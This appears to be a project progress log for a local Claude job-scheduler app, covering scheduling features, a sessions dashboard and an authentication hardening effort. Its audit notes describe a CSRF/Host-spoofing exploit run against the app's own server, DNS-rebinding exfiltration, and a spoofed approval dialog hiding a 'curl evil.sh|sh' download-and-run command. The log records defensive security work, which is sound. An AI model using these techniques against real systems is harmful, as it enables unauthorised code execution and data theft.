  - **Slots now carry attempt *times*, never bead ids.** Pinning bead X to 14:32 at plan time re-creates the mirror M4a rejected — by then a human may have closed it, a dependency may have re-blocked it, or someone may have claimed it. Times are ours to pin; readiness is beads' to own, so identity is resolved at launch by the existing ready→lease→`bd show`→claim sequence. Consequence the UI must state: the preview is precise about the budget and explicitly *advisory* about which work runs.
  - **Claiming ahead is forbidden**, and the reason is measured: plan-time claims would make beads invisible to `bd ready` (bug #1 verbatim), and a 20-slot burst that tripped its ceiling at slot 3 would write ~34 uncommitted audit lines into the human's git-tracked `.beads/interactions.jsonl` for work that never ran (hand-back costs 2 lines, one per changed field).
  - **Candidates must be `state === 'active'`** — asserted by its own test, because `GET /api/projects/:id/ready` deliberately works on a `pending` project so a human can preview before activating. A planner reading ready-work naively would plan, then run, work from a repo nobody activated: the activation airlock, defeated.
  - [x] **`bursts` table + `lib/burst.js`** — shipped 2026-07-25. Timetable + ceiling, **extending** `lib/budget.js`'s `plan()` via a new optional `costPct` rather than re-implementing budget maths that could disagree with what `admit()` enforces. `budget` also now exposes `snapshotProblem()` so both policies test the *same* reading and then act oppositely on purpose: `admit` fails **open** (a broken probe must not become a silent outage), a burst fails **closed** (a burst whose spend can't be measured has no ceiling at all). `pollProject` gained `max`/`trigger`, which *compose* with the project's own cap rather than replacing it. Four invariants mutation-checked: the activation airlock, fail-closed on an unusable reading, the measured ceiling, and one-live-burst.
    - **Found while writing the tests:** the consumed slot was removed *by value*, so two slots sharing a timestamp were both dropped at once — the planner emits one `at` per concurrent slot, so that would silently discard confirmed attempts. Removed by index now.
  - [x] **measured live ceiling** — the deliberate fail-**closed** exception to the spec's fail-open rule. Also: a window reset mid-burst *ends* it rather than re-baselining (re-baselining silently grants a second full budget), and a pause **holds** slots without ending the burst so unpausing resumes rather than forcing a re-plan.
  - [x] **plan/preview/confirm on the existing Projects tab** (no new tab) + presets + a live strip driven by measured spend. Live-verified over CDP: preview → confirm → strip → cancel, cancel-confirm **dismissed is a genuine no-op**, and `burstMinGapMin` round-trips through Settings and rejects out-of-range without storing.
    - **Three things only looking caught**, all fixed and re-verified: the min-gap field was blank so the effective spacing was invisible (now shown, from the value the server actually used); slot chips used relative times, which rounded two different slots to the same "in 1h" and read as a duplicate (absolute times now, one per row, like the burn-down plan); and the assumptions leaked the raw `five_hour` window key — **the exact bug M2 already fixed in `renderPlan`**, re-introduced because the text comes from `budget.plan` and I hadn't reused the humanise step.
    - **A misdiagnosis worth recording:** the burst dialog showed "no activated projects" and I attributed it to the 5s tick not having run. Wrong — the real poller had marked the fixture `error` (no `bd` on PATH), so filtering it out was *correct*. The defensive fix (the dialog fetches instead of trusting the background tick) was kept on its own merits, but the bug I thought I'd found wasn't there.
  - [x] **per-bead worktrees** (folded in from the M4a review, user's call 2026-07-25). Clamp-to-1 removed; `maxConcurrent` still defaults to 1, because lifting a data-loss clamp is not the same as making parallelism the default. ⚠️ The bead level joins with `--`, **not** `/`: git refuses a branch `a/b` when branch `a` exists and M4a installs already have per-project `scheduler/<proj>` branches, so nesting would have broken exactly the repos running longest — and a nested *path* would plant the bead's worktree inside the project's old one, which then reports it as untracked.
    - **Reaping is now mandatory and wired in three places**, because `worktree.remove` had *no production caller at all*: one reused directory per project cost nothing to forget, one per bead that ever ran is an unbounded leak. `onDone` reaps in `finally` (not paired with each of the five lease-release sites, so a path added later can't leak silently); `tryRun`'s give-up paths reap via a `prepared` flag on `abandon()`, which is the shape that leaks if reaping only lives in the completion handler; and `recoverOrphans` sweeps what a crash left behind. A failed reap is reported and never fatal — the bead's outcome is already decided.
  - [x] **two pre-existing defects, both fixed 2026-07-25 — 254/254 tests pass, both mutation-checked, both live-verified.** Found reviewing the rewritten plan against shipped code, not by a test.
    - **The M2 burn-down planner could arm a bead's job row — and reproducing it live showed it was worse than the review thought.** `openPlanDialog` listed *every* job including bead rows (merely labelled "(disabled)") and `/api/budget/plan/apply` force-enables whatever is picked, by design, so a plan can't silently swallow slots. The review called the damage "intermittent, since the next poll rewrites the row to `enabled: false`". **That was wrong, and driving it proved so:** `apply()` round-trips the row through `validateJob`, and `validateFields` drops keys the extension doesn't declare, so **`_beadId`/`_projectId` are stripped**. Measured on a live server with the guard neutered: the row came back `enabled: true` with a real future `nextFire`, no `_beadId`, and `model` silently rewritten from the project's configured value to `default`. That **detaches the row from its bead permanently** — `findJobByBead` stops matching (verified directly: "NOT FOUND"), so the poller can neither heal nor reuse it, mints a *second* row for the same bead and discards the cost history §4a.7 depends on, while the orphan keeps firing the bead's prompt on a schedule with no lease, claim or close. Nothing self-heals. Fixed in `/api/budget/plan`, in `/api/budget/plan/apply` (checked independently — apply is the call that enables) and in the dialog, which now says how many bead tasks it hid and why. The test asserts the row stays *attached*, not just disabled, because that is the consequence that lasts.
    - **`config.budget` from a repo's `.scheduler.json` was never validated** — `parseProjectConfig` accepted any object and `materialise` copies it straight onto `params.budget`, bypassing `budgetParams` (it builds its row with `createJob`, not `validateJob`). Now routed through `budgetParams`, which gained a `label` and an `allowIgnoreGuard` flag. **Decision taken here:** a repo may *not* declare `ignoreGuard`. `permMode` is the repo saying what unattended work may do to *its own files*, under its own git review — fair for it to grant. The budget guard protects account headroom shared with every other project on the machine, which is the human's to allocate, so a repo may make itself more conservative (`minHeadroomPct` only ever restricts) but may not exempt itself. An attempt is a **config error, not a silent strip**, for the same reason an unrecognised `permMode` is.
- [x] **UI polish · icons, thresholds, reset times** — `2026-07-26-ui-icons-thresholds-time.md` — **shipped 2026-07-26, 281/281 tests pass, live verified over CDP.** Three user-requested changes, taken ahead of M5 because the icon set is something M5's Sessions tab needs anyway. Light mode, mobile and the rest of the UI warts are explicitly out of scope.
  - [x] **`public/icons.js` — the app's first SVG.** Every icon was an inline unicode glyph and there was no helper, which is why `＄` (U+FF04 **fullwidth**) next to `🤖` read at two unrelated optical weights. `terminal` is Lucide `square-terminal` (ISC) — picked over Lucide's bare `terminal` because the ask was "like the Terminal icon on mac", which is a rounded *window* with a prompt in it. `claude` is the 12-ray sunburst from `claude-sessions-dashboard` (MIT), the author's own mark echoing Claude's; deliberately **not** the official Anthropic asset, since vendoring a trademarked logo file is a different decision from vendoring MIT code. Contract is additive: `iconName` is preferred, `icon` remains the fallback, and an **unknown** `iconName` falls through to the glyph rather than rendering nothing. Name lookup is a map read, so a manifest can't inject markup.
  - [x] **attribution done first** (it's the licence obligation, and M5 §5.1 already required it): `LICENSES/lucide-ISC.txt`, `LICENSES/claude-sessions-dashboard-MIT.txt`, and `NOTICE`. Lucide is recorded as **ISC** — worth stating once, because the upstream copy labels its own Lucide-derived icons "MIT" in two inline comments while its README says ISC.
  - [x] **`whenText` in `public/util.js`** replaces the usage strip's `untilText`, which was h+m forever — a weekly reset six days out read `in 148h 12m`. Scale now changes with distance: `in 43m` → `in 3h 20m` → `tomorrow 11:30 PM` → `Sat 11:30 PM` → `Sat 2 Aug, 11:30 PM`. **Deviation from the ask, deliberate:** "1 or 2 days if short" is dropped in favour of naming the day, because `tomorrow 11:30 PM` answers "does it land before I stop working" and `in 2 days` cannot, in the same width. "Tomorrow" is decided by **calendar date** built from y/m/d, not a ms division, so a DST shift can't make consecutive days read 0 or 2 apart.
    - **Fixed a live rounding bug on the way past:** `Math.round` on the minutes remainder rendered 3h59m40s as **`3h 60m`**. The screenshot harness had already noticed — its fake usage payload picks deliberately non-round offsets (2h07m, 3d05h13m) with a comment saying exactly that. Also `in 8h 0m` → `in 8h`.
    - `fullTime` gained `timeZoneName: 'short'`, so every tooltip that already showed an absolute time now names the zone. That's where "IST" belongs — on hover, not in an 11.5px label. **Note:** this machine's browser is `en-GB`/`Asia/Calcutta`, so times render **24-hour** (`Wed 19:13`, not `7:13 PM`). Left locale-driven on purpose: forcing 12-hour would make the label disagree with the `toLocaleString()` tooltips beside it.
  - [x] **amber 75 / red 85, display only.** `FAIL_PCT = 95` was hardcoded in the frontend while `usageWarnPct` was a 1-99 setting, so **any warn above 95 made the amber band unreachable** — the higher test wins first. Rather than clamp (which hides it), crit is now the `usageCritPct` setting, default 85, validated `1-99` **and** `> usageWarnPct`; both defaults live in `lib/usage.js` so the frontend's pre-first-probe fallback can't disagree with the server. The pair is validated **before either key is written** — the exact partial-write trap M4a's settings PUT already shipped once. Kept strictly separate from `lib/budget.js`'s `reserveFiveHourPct`/`reserveWeeklyPct`: colouring a meter and refusing to launch are different judgements, and the shared 80/95 was a coincidence of defaults, not one source.
    - **No migration, deliberately.** An existing install has `usageWarnPct: 80` persisted (the form submits every field, so the old default got written out). 80 sits inside the new 75/85 pair, and "the user chose 80" is indistinguishable from "the form echoed 80" — so it's left alone and only fresh installs see 75.
  - [x] **live verified 2026-07-26 over CDP**, driving the seeded screenshot sandbox (fake `claude`, so zero quota). One real meter walked through all three levels by moving the thresholds: Fable at 90% → `fail` red at 75/85, `warn` amber at 75/95, and `accent` at 91/95 — the last confirming an API-flagged `critical` bucket still colours **below** the warn threshold. Inverted pairs rejected inline via `#settings-msg` with the poll interval provably intact (no partial write). All 13 job rows render SVG with no fallback glyph and identical 16×15 icon boxes, so names stay aligned; the type selector and the extension settings legend both resolve too. `whenText` exercised across all ten bands in the browser.
    - **Cosmetic quirk found, not fixed** (pre-existing, out of scope): two saves inside 2s let the first one's clear-timer wipe the second's `saved ✓`. → **Fixed 2026-07-31** (bead `ehd`): one tracked `settingsMsgTimer` in `saveSettings`, cleared before each message and on the error path so an error also outlives a stale wipe. Reproduced pre-fix and verified post-fix in a real browser over CDP: message sampled at t₀+2150ms after saves at t₀ and t₀+600ms — old code `''`, fixed code `saved ✓` visible on screen, still clearing by t₀+2900ms.
- [x] **API hardening · loopback-only `Host`, JSON-only mutations** — commit `9717025`, **284/284 tests pass at the time.** M5 §5.6 asked for this to be decided for the whole API rather than just the sessions routes; settled by **exploiting it**, not by reasoning about it.
  - Against a throwaway dev server: two real jobs created, then one cross-origin form-style `POST` (`Host: evil.example.com`, `Content-Type: text/plain`, **no body**) to `/api/cleanup` → **`200 {"ok":true}`, both jobs gone**. `GET /api/settings` with a foreign `Host` → `200`, leaking the payload including `home`. Binding to `127.0.0.1` stops nothing a browser does on the user's behalf.
  - Two guards, two different attacks. **`Content-Type: application/json` on POST/PUT/PATCH/DELETE** closes CSRF (a cross-origin form can only send urlencoded/multipart/text-plain; a `fetch` that sets JSON becomes preflighted, which we never answer). Note that rejecting an unparseable *body* would **not** have helped — the destructive routes take no body at all, so `express.json` left `req.body` as `{}` and they ran anyway. **The header is the signal, not the payload.** A **loopback-only `Host`/`Origin`** defeats DNS rebinding, which is what turns a read-only endpoint into exfiltration — and M5 makes that payoff enormous, since `/api/sessions/:id/conversation` would serve every word the user has ever typed into Claude Code.
  - Applies to **every** route including GET, ahead of `express.json` and `express.static`. **This is a new convention** — there was no `Host`, `Origin`, CSRF or `Content-Type` check anywhere before — and it cost nothing at the callers, since `util.js`'s `api()` and the test harness already send the header unconditionally. `tools/screenshots/seed.mjs` sent it only when there was a body, and was fixed with the change.
  - ⚠️ **Testing a header-based guard needs raw `node:http`**: `fetch` silently drops a manually-set `Host` (a forbidden header in undici), so the attack arrives with a correct `Host` and passes for the wrong reason. Re-ran the original attack against the patched server: **403, both canaries intact, app unaffected.**
- [x] **M5 · sessions dashboard** — `2026-07-25-m5-sessions-dashboard.md` — **all 6 steps shipped; epic closed 2026-08-01.** Steps 1–3 shipped 2026-07-26; steps 4–6 landed 2026-08-01 (commits `10fd2a0` parser structure, `2b6889d` routes, `2b1a112` tab, `219473f` per-tool renderers, `e6f4885` tooltips app-wide, `89c6f50` v3 screenshot baseline). Deep CDP drive: 23 scenarios, 21 first-pass, both failures diagnosed and fixed same-day (history cross-link filter; conversation search wiring), zero console errors. Suite 444/444. Suite is at 371/371 as of the v3 auth work; the 324/324 figure below was the count when M5 step 3 landed. Plan audited against the real upstream file, then **measured against the real corpus before writing code** (57 depth-1 files, 122MB, ~27,350 rows) — see plan §5.0 for the table. Upstream is a single 2,218-line **Python** script (no `package.json`, untracked here), **65% of it UI**, so this is a ~370-line reimplementation, not a file move.
  - **Measuring first changed four of the plan's rules, two of them wrong rather than merely imprecise:**
    - **The default entrypoint filter would have hidden every session §5.4 exists to show.** All 5 runs in the live DB carrying a `meta.sessionId` resolve to a real file, and **all 5 are `entrypoint: "sdk-cli"`** — what `claude -p` writes, and exactly what upstream's `INTERACTIVE_ENTRYPOINTS` excludes. Visibility is now a **union**: interactive **or** referenced by a `runs.meta.sessionId`. The one correction that changed a decision rather than a comment.
    - The prompt-noise list was missing its three largest real classes: `<task-notification>` (39), `<local-command-caveat>` (25), `<command-message>` as a **leading** prefix (3 — `/doctor` emits it before `<command-name>`). And `promptSource`/`isMeta` **cannot** be preferred over prefix-sniffing as §5.3.4 assumed: they exist on 2.3% and 1.7% of user rows.
    - `<system-reminder>` is embedded **inside `tool_result` content** on 24 rows and leads only 1, so a prefix test cannot reach it — the transcript needs a block strip. `<local-command-stdout>` carries raw ANSI SGR escapes.
    - **Three of the plan's fixes are zero-difference guards, not corrections**, and are commented as such rather than claimed as bug fixes: the `isSidechain` filter (**0** of 20,559 depth-1 rows set it — subagent transcripts are segregated into their own files, which depth-1 discovery excludes structurally), the `turn_duration` subtype check on `activeMs` (`durationMs` on **146/146** turn_duration rows, **0** of the other 72 system rows — both readings give 41.61h), and treating naive timestamps as UTC (**all 21,478** real timestamps already carry `Z`).
  - [x] **step 1 attribution** — shipped with the UI-polish milestone above (`LICENSES/`, `NOTICE`, Lucide ISC).
  - [x] **step 2 `lib/sessions.js` parser + the dedupe fix** — commit `0854cd7`. **State the ratio precisely, because it is easy to quote the wrong one:** rows per unique `message.id` is 1.60/1.98/2.13×, but the **output-token over-count is 2.30/2.49/2.78×** — higher, because the rows that repeat most are the expensive ones. Across 577 duplicate groups **0** had a differing `usage`, so keeping one row per id is exactly right, not an approximation. ⚠️ `usage.iterations[]` repeats the same figures again and must never be added. Tokens accumulate **per model**, which removes upstream's split-the-total-by-turn-share apportionment instead of approximating it, and the model histogram increments inside the same dedupe guard so it counts turns not content blocks.
    - **Found by running it over the real corpus, not by reading it: the lossy folder-name `cwd` fallback is live**, firing on **3 of 59** sessions (224-byte stubs with no `cwd` on any row) — and because this machine's home directory name contains a hyphen it decodes `/Users/vignesh-5036/…` to `/Users/vignesh/5036/…`, **a path that does not exist**. Metadata now carries `cwdGuessed`: a resume that runs `cd <cwd>` would land nowhere, and a UI rendering it unqualified would be lying. Not yet consumed by any UI — **step 5 must surface it.**
    - Validated end-to-end: all 59 real files parse, **0 nulls, 0 throws, 0.3s** (≈5ms/file). Four guards mutation-checked (disabling the dedupe fails 2 tests; removing each of the other three fails 1).
  - [x] **step 3 cache table + live index + watcher** — commit `5ca4e5e`. `sessions` table (a **cache of files we do not own**: `cleanupAll` clears rows, never unlinks a transcript) plus `createSessionIndex` with the mtime/size cache, the liveness rule, `fs.watch` + a 15s liveness ticker, `rename`/`remove`/`resumeSpec`, and the runs join.
    - **`rename`/`remove` re-stat the file rather than trusting the cached mtime.** Liveness otherwise only moves when a scan runs, so a session that went live inside the 15s tick still looked idle — precisely the direction that matters, since the gate exists to avoid appending to a file another process is writing. This app spawns `claude` itself, so that is normal operating state here, not an edge case.
    - **Our own rename-append must not make a session look live.** The exemption keys on the **exact mtime our write produced**, not a time window, so anything else writing afterwards moves it off that value and the session is live again. Upstream's own rename bumps mtime and greys out its own Delete for 60s.
    - **Bug found by a test that only asserted `start()` must not throw:** emitting `'error'` on an EventEmitter with **no listener throws** rather than being dropped, so a missing `~/.claude/projects` crashed startup. Warnings now only go out when someone is listening.
    - Two measurement traps that cost real debugging time, now comments in the tests: macOS reports `mtimeMs` with **sub-millisecond** precision while `utimesSync` takes a ms-precision `Date`, so "restoring" an mtime truncates it and moves the cache key; and **`fs.watch` needs a moment to arm**, which made the watcher test pass alone and flake in the full run (it now waits on the condition, verified 3× clean).
  - [x] **step 4 — `/api/sessions/*` routes** — commit `2b6889d`, bead `cfn.1`. All routes minus SSE (superseded — see v3 auth notes). `needSessions` 501 guard; the image route re-derives the realpath guard because `sessions.get()` does not apply it. Both guards mutation-checked; the traversal test's first version was itself a false negative (its "escaped" file had no image, so a broken guard still 404'd) and was fixed to serve real secret bytes before being trusted.
  - [x] **step 5 — Sessions tab + cross-links** — commits `2b1a112` + `219473f`, beads `cfn.2`/`a6o`, per `docs/specs/2026-07-27-sessions-tab-visual-design.md`. Preceded by bead `yqj` (commit `10fd2a0`): the parser now keeps tool structure (toolUseId join key, toolUseResult verbatim) and caps at serialise time — the spec's load-bearing finding. `cwdGuessed` surfaced (badge + disabled Open + 400 on resume), per-tool renderers with generic fallback, md.js as the single sanitiser path settled by running the attacks.
  - [x] **step 6 — live CDP drive + screenshot baseline** — bead `cfn.3`, v3 baseline supersedes v2 (`89c6f50`), 42 shots incl. two Sessions shots. 23-scenario drive (parallel-call pairing, 296-char Bash wrap measured by scrollWidth, cwdGuessed qualification, per-tool renderers in a real browser, rename round-trip, arm-then-confirm delete). Two real defects found and fixed same-day: **(a)** `#history?job=` cross-links silently no-op'd — `showTab` wrote the select's value before its options existed (fix: carry until buildable; mutation-checked in the browser, value='' and both jobs leaked pre-fix); **(b)** `expandSearchHits()` had no UI caller — now wired to a search box in the conversation dialog (typing expands matching collapsed turns, clearing re-renders to the collapsed default).
  - **Deferred deliberately:** the cost estimate (§5.3.5). Per-model token accumulation makes it exact rather than apportioned whenever it is wanted, but the account is a subscription, so it is an API-rates approximation either way — tokens-only for now.
- [ ] **M6 · deferred** — full rename (launchd label `com.claude-scheduler`, package name, `~/.claude-scheduler` data dir) with migration; optional `node:sqlite` migration

## v3 — local API authentication

Spec: `docs/specs/2026-07-26-local-api-auth-design.md` · plan: `docs/plans/2026-07-26-local-api-auth.md`.
Triggered by an exploit found while auditing M5 §5.6, and prioritised by the user above all other
work: *"I don't want any other service/website to be able to schedule jobs on my machine."*

- [x] **Phase 0 · the header guards** — `9717025`, see the entry above.
- [x] **Phase 1 · capability token** — `53dc29e`, `5fe0362`. 32 random bytes, `~/.claude-scheduler/token` at `0600`, `timingSafeEqual`, required as `Authorization: Bearer` on **every** `/api/*` route including reads. Mounted on `/api` only so the shell can still load and *say* it has no key. `bin/claude-scheduler open` delivers it in a URL **fragment** (never sent to a server, so it cannot reach a log); the page stores it and strips it.
  - Storage is `localStorage`, **not** a cookie, and the reason reverses the usual instinct: an origin is scheme+host+**port**, so `localStorage` is port-scoped, but **cookies ignore the port entirely** and would hand the token to every other local service the user visits. `__Host-` would fix that but needs HTTPS.
  - **A subagent found a real bug in the plan's own `tokenMatches`:** it guarded on *string* length then compared *buffers*, so 64 multibyte chars (128 bytes) passed the guard and made `timingSafeEqual` **throw** — a 500 instead of a 401, from an attacker-controlled header. Pinned by a test that sends exactly that.
  - **Two bugs found by running it, not reading it.** The plan had the CLI `openDb()` to read a `port` setting — which nothing ever writes, so it always fell through, while `migrate()` + schema ran and **created `scheduler.db` as a side effect of a read-only question**. The daemon now publishes the port it actually bound and the CLI reads that, fixing the real bug underneath: sending someone to the wrong port with a valid token looks exactly like a broken token. And `install.sh` probed `/api/settings` for liveness, which now answers 401 — `curl -sf` treats that as failure, so a **healthy daemon reported "starting…" forever**.
  - **The SSE live tail is deleted, not authenticated** (user's call, and the better answer): `EventSource` cannot send an `Authorization` header, so keeping it meant either a second auth path or the token in a URL. `GET /api/runs/:id/log` already existed, so this was net-deleting; the web view is a snapshot with Refresh and a `tail -f` command, and live output is followed in a terminal. Also drops M5's planned `/api/sessions/stream`, and with it the "SSE must `res.end()` or the suite hangs" trap.
- [x] **Phase 2 · Touch ID / password on six high-power actions** — `c6e3597`. `lib/approval.js` + a ~40-line Swift helper compiled from source by `install.sh` into `~/.claude-scheduler/bin/LaunchBox`.
  - **Grounded in a spike before the design was written.** The decisive question — can `LAContext` prompt from a background launchd **agent** — is **yes**, measured from `gui/502` with no TTY. `swiftc` takes 3.7s and emits the **adhoc signature Apple Silicon requires**, so no developer certificate; stripping it gets the binary **SIGKILLed (137)**, which makes install-time tamper detection free. Deny is `errorCode -2`, distinguishable from broken.
  - **The dialog title is the helper's filename**, verified across three real dialogs, and the reason string is appended to "*<filename> is trying to* …". So the binary is named `LaunchBox` and every reason completes that sentence naming the object in quotes. **Touch ID and password approvals are indistinguishable to us** (only elapsed time differed: 34.4s vs 67.6s), so the log may only ever claim "approved", never "approved by fingerprint". That 67.6s also forced the timeout from 120s to **180s**.
  - **`claudePath`/`bdPath` were missed in the first draft of the spec and are the most important gate.** They name executables: repoint one and every existing job runs an attacker's binary — **no job created, so no other gate touched**. Gating job creation while leaving them open would have made Layer 2 decorative.
  - Grace is **5 min for job create/edit/enable only**, keyed to the caller's token, and **never** for cleanup, uninstall, activation or the executable settings — a grace window *is* an attack window. Three subagent decisions kept as improvements: helper-presence is checked **before** grace (deleting the helper can't ride an open window), grace is **fixed not sliding** (editing every 4 min can't hold it open forever), and every `LAError` other than `-2` maps to `approval_unavailable`, because "could not establish that a human approved" is a different claim from "the human said no".
  - **Two ordering bugs found while wiring, the same mistake twice:** the job-creation and project-activation gates initially ran *before* their validation, asking the user to authenticate a request that was going to be rejected anyway. Order is now validate → approve → write, and the write-after-gate rule is mutation-checked.
- [x] **The frontend contract is structural, not conventional.** `api()` in `public/util.js` is upgraded **in place**, so every existing and future page inherits the token, the 401 banner and the failure codes *by doing nothing* — opting out is the unusual act. `tests/frontend-conventions.test.js` fails if any page calls `fetch` directly, uses `EventSource`, or lets the approval-copy vocabulary drift from `lib/approval.js`. Both halves mutation-checked.
- [x] **Task 12 · approval UX** — `6d880d2`. The job dialog, project activation, cleanup and uninstall show "waiting for your approval…" (an approval holds the request open for up to 180s, and without it the UI looks hung and the natural response is to click again). A refusal keeps every field and explains itself from the shared vocabulary.
  - **Four bugs found by driving Chrome, none catchable by a test.** The worst: **the token fragment collided with the tab router** — `#token=…` arriving in an *already-open* tab fires `hashchange`, `showTab()` read `token=…` as a tab name and hid all four sections, then `auth.js` stripped the hash with `replaceState`, which fires no `hashchange`, so nothing recovered. A blank page with the token stored successfully. Also: `button[type=submit]` matched nothing (a `method="dialog"` form's save button has no explicit type, so the waiting state would never have appeared); the cleanup/uninstall handlers took no event parameter, making `ev.currentTarget` an undeclared identifier; and `onProjectAction` had no element parameter. The plan's banner CSS also referenced three CSS variables that do not exist in this repo.
  - `tools/verify-auth-ui.mjs` drives the whole frontend with **no helper compiled**, so every gated action answers 503 rather than prompting — the entire UX contract is provable without spending one of the batched prompts. **19/19.**
- [x] **The screenshot harness was broken by the auth layers, in four ways at once** — `3c615cd`. Not covered by `npm test`, so nothing caught it: `seed.mjs` sent no `Authorization`; `capture.mjs` probed `/api/settings` for liveness (now 401, so it would time out against a healthy daemon); the browser got a plain URL, so all 40 shots would have captured the auth banner; and job creation is now gated, so seeding would have 503'd. Fixed, and the sandbox gets a **non-prompting stub helper** in its throwaway `CS_DATA` — the same principle already applied to `claude`, commented as sandbox-only. **Verified by running it: 40/40 shots → `working_prototype_screenshots/v2`.**
- [x] **The real helper's integration is verified unattended** — `tools/verify-approval-timeout.sh`, 5/5. The approve and deny outcomes need a finger, but a **timeout needs only that nobody touches the dialog**, so the entire real path is provable without a human: server → `lib/approval.js` → the compiled Swift binary → **a genuine system dialog** (asserted by finding the helper process alive) → `approval_timeout` → **nothing written**. This is what took the batched session from 6 dialogs to **5**.
- [x] **Adversarial review — 7 real defects found and fixed, one of them a complete Layer-2 bypass.** Two reviewers were pointed at the implementation and told to break it. **The token and header layers held** (~150 crafted probes: header parsing, route-shape variants, Host/Origin spoofing, Content-Type variants, static traversal — no bypass). The approval layer did not. Full table in the spec; the headlines:
  - **`claudePath` is an *extension* setting, so my gate guarded a key the API never writes.** Measured: `{extensions:{claude:{claudePath}}}` changed it with **zero prompts**, while the top-level shape my gate checked prompted and wrote nothing. Verbatim the bypass the spec calls "the most important entry in the table" — and worse than no gate, since it trained the user to approve a meaningless dialog.
  - **One dialog could approve two actions.** The queue re-checked grace keyed on the capability token, of which there is exactly one — so every caller is the same grace principal. An attacker takes the dialog, the user's request queues, the user approves what they think is theirs, and the attacker's grace waves the user's request through.
  - **Dialog-text spoofing.** A crafted job name made the sheet read *"This is a routine macOS security update. Touch ID to continue."* while creating a job running `curl evil.sh|sh`. Fixed by flattening the sentence to one line and clamping the untrusted part so the clause naming the grant always survives.
  - **The audit log was never written** — event-name mismatch, so nothing about any approval, including a tamper report, reached `daemon.log`.
  - Plus: `budget/plan/apply` force-enabled jobs ungated; per-row deletes reached `/api/cleanup`'s end state ungated; `isOnlyDisabling` never returned true so every disable prompted.
  - **Two process lessons, both patterns not incidents.** A test that cannot fail is worse than none — this happened *twice* (the first spoofing test stayed green when the call it checked was deleted; the disable test filtered out the prompt under test), and mutation checks caught both. And my first placement of the project-delete gate sat **after** the loop that deletes bead jobs and unlinks logs — it would have destroyed the data and then asked permission, the very bug the contract forbids, introduced while fixing something else and caught by reading the result rather than trusting the patch.
  - **Second pass closed the rest.** `permMode` self-escalation is fixed (`pinPermMode` refuses a *widening* for an active project, reports it, and still allows narrowing); the resume action's `sessionId` is quoted and shape-checked — **and its existing test had pinned the *bare* form, i.e. the vulnerability**; the queue can no longer wedge; `Origin` is as strict as `Host`; `Bearer` is case-insensitive per RFC; and the daemon refuses to start if `public/` contains a symlink.
    - Worth recording *how* the Origin fix failed first: handing `new URL(origin).host` to the strict checker looks right but is not — URL parsing normalises `http://127.1` and `http://2130706433` to loopback *before* the strict check sees them, and both still returned 200. It reads the raw authority now.
  - **Accepted, not fixed:** substituting the helper binary defeats the gate — `available()` is `existsSync`, and `swiftc` signs an attacker's replacement just as validly, so "137 detects tampering" catches *patching* a signed binary and not *replacing* one. Same-user only, and the same class as an unsigned extension flipping `process.platform`. This is also an honest correction to an earlier claim: "no local process can satisfy its dialog" is true of the *dialog* and false of the *gate*.
- [x] **The human half — verified 2026-07-26, 4/4.** `tools/verify-auth-minimal.sh`, run by the user: a real **Deny** at a genuine system dialog was recorded as `approval_denied` with **nothing written**, and a real **approval** of the identical retried request created the job and landed in the audit log. That closes the only outcomes no machine here could exercise, so **both halves of the two-party protocol are now verified.**
  - The retried-request shape matters: it is exactly what the UI does when you press Submit again after a refusal, so this also confirmed the state-preservation contract end to end with a real dialog rather than a fake approver.
  - Two dialogs rather than ten because everything around them was already machine-verified: which actions gate and that a refusal writes nothing (`tests/api.test.js`, fake approver, mutation-checked); grace scoping, the queue, timeouts and tamper detection (`tests/approval.test.js`, using the real binary's captured payloads); server → real binary → **a genuine dialog** → refusal (`tools/verify-approval-timeout.sh`, via the timeout outcome, which needs no input); the token, header guards and the UI keeping your work on a refusal (`tools/verify-auth-ui.mjs`, real Chrome).
  - `docs/spikes/auth-verify.sh` (8 steps, 5 dialogs) remains for eyeballing the dialog wording and the grace behaviour directly if that is ever worth re-checking.
  - **Cosmetic, not a failure:** the script's teardown kills the sandbox daemon with `kill -9`, so the shell prints a `Killed: 9` line *after* the results. Worth tidying if it ever reads as an error.
- [x] **The FULL batched sitting was run against real dialogs — 2026-08-01 (bead claude-scheduler-j8u).** `tools/verify-auth-sitting.mjs` drives the whole plan table (Task 13) plus the two unticked Task 8 rows through the real UI in a real Chrome against the compiled+pinned helper, in ONE sandboxed daemon. Result: every row verified — deny→retry-approve (state preserved, one client POST), graced edit (no prompt), cleanup-denied-despite-grace (nothing deleted), project activate (state=active), claudePath change (prompted, grace never applies), usagePollSec (no prompt); Task 8's run→log→Refresh advanced "as of" and the original exploit still 403/415/403/401. The timeout row and `localauth.sh` (18/0, wording confirmed) were run for real. The 2026-07-26 2-dialog session above was the interim evidence; this is the full sitting the plan asked for. Plan table ticked with a per-row Result column.
  - **Two substitutions, recorded in the plan (not laundered):** (1) rows reordered so deny/timeout precede the first approval — the literal order graces rows 2–4 into silence, exactly what `auth-verify.sh` already worked around; (2) the timeout row is delegated to `tools/verify-approval-timeout.sh`, because a browser-driven timeout is re-sent by Chrome after the 408 and raises a phantom second sheet. That browser-retry is filed as **claude-scheduler-tki** (low severity, fails closed) for separate investigation.
  - **Two harness bugs found and fixed while building the driver, both worth remembering:** project activation raises a native `confirm()` that blocks CDP — the eval-click hangs until it's answered, so the driver uses `page.withDialog('accept', …)`; and `localauth.sh` asks the operator a `[y/N]` wording question via `read`, so it must be spawned with `stdio:'inherit'` (piping stdin as `ignore` feeds it EOF → defaults to N → false wording failure even when the sheet is correct).


**Status: SHIPPED, both halves verified. 371/371 tests · 19/19 driving the real UI in Chrome · 40/40 screenshots · 5/5 against the
real Touch ID helper · 22/22 in the batched session's dry run · 16 defects found and fixed by
adversarial review, including one complete Layer-2 bypass.**

**Everything the review found is now fixed except one irreducible item.** The helper binary is
checksummed at install and re-verified before every spawn (verified by substituting an
always-approve binary: refused, and the log names the mismatch); `process.platform` is snapshotted
at module load, out of reach of an extension; and the `Origin` port is pinned. What remains is
same-user code able to overwrite **both** the binary and its pin — which needs a root of trust
outside the user's own account, and this design has none to offer. Everything is code-complete and verified except the one step that
requires a human fingerprint.

✅ **The live daemon now runs the patched build** (restarted 2026-07-26, pid replaced, all 15 jobs
intact, nothing was in flight). Verified against the running instance rather than a sandbox: the
original exploit returns **403**, a form content-type **415**, the `Host` read-leak **403**, and a
tokenless read **401** — all of which answered **200** minutes earlier. The approval helper is
compiled into `~/.claude-scheduler/bin/LaunchBox` and reports ready, so the six gated actions are
armed. Reopen the UI with `node bin/claude-scheduler.mjs open`.

Stability: `npm test` run 3× → 359/359 each time, no flakes. `tools/verify-auth-ui.mjs` re-run →
19/19.

## ✅ Fixed 2026-07-28 — a discovered repo silently normalised an invalid .scheduler.json value

- [x] **FIXED and verified.** Bead `claude-scheduler-5x7`.

